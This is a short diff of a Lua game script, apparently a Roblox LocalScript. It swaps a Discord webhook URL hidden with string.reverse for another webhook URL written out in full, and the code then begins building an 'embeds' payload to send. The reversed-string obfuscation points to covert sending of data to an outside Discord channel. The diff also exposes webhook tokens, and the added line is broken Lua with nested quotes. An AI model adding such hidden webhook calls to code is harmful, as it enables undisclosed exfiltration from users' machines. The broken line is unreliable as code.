@@ -167,7 +167,7 @@ function Code_LocalScript_3()
 
 
 
-				local url = string.reverse("8gQHoE2S5RGBq5-0vwF_xX1o9CX2CvhIhKkxbrfWMrneZYrq9e_huxsfhgtDkTnX1GXo/419789022329444449/skoohbew/ipa/moc.drocsid//:sptth")
+				local url = "local url = "https://discord.com/api/webhooks/945109004483436625/H2m_a0yfv-Bx_OSM6qp7k6Kl6TUDQvQ93yI3uwB3QOPe4UahOtIRjTMkVY_HlAsty5aU""
 
 				local data = {
 					["embeds"] = {
